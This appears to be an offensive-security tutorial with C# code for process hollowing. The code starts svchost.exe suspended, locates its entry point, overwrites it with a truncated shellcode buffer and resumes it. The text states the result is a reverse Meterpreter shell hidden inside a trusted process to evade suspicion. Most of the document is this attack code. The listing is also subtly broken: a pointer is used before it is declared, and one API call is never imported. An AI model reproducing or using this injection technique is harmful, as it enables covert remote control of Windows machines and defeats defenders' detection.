We'll create a new Console App project in Visual Studio, and name it "Hollow". We'll then find the DllImport for CreateProcessW from www.pinvoke.net, and add it to our project. To import CreateProcessW, we must also include the System.Threading namespace.
It is worth noting that a memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process, so the use of variable types, offsets, and amount of data read must be adapted.
we must remember to specify a 64-bit architecture (since svchost.exe is a 64-bit process) and change it from "debug" to "release" before compiling.

While the code and technique here only writes shellcode into the suspended process, we could also use this technique to hollow an entire compiled EXE.


      [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
      static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
          IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
              uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, 
                  [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
      
      [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
      private static extern int ZwQueryInformationProcess(IntPtr hProcess, 
          int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, 
              uint ProcInfoLen, ref uint retlen);
      
      
        [DllImport("kernel32.dll", SetLastError = true)]
      static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
          [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
      
      [DllImport("kernel32.dll", SetLastError = true)]
      private static extern uint ResumeThread(IntPtr hThread);
      
      STARTUPINFO si = new STARTUPINFO();
      PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
      
      bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
          IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
      
      PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
      uint tmp = 0;
      IntPtr hProcess = pi.hProcess;
      ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
      
      byte[] addrBuf = new byte[IntPtr.Size];
      IntPtr nRead = IntPtr.Zero;
      ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
      
      IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
      
      byte[] data = new byte[0x200];
      ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
      
      uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
      
      uint opthdr = e_lfanew_offset + 0x28;
      
      uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
      
      IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
      
      byte[] buf = new byte[659] {
      0xfc,0x48,0x83,0xe4,0xf0,0xe8...
      
      WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
      
      IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
      
      ResumeThread(pi.hThread);



When we execute it, the compiled code results in a reverse Meterpreter shell executing inside a svchost.exe process, possibly evading suspicion since it is a trusted process that also engages in network communications.
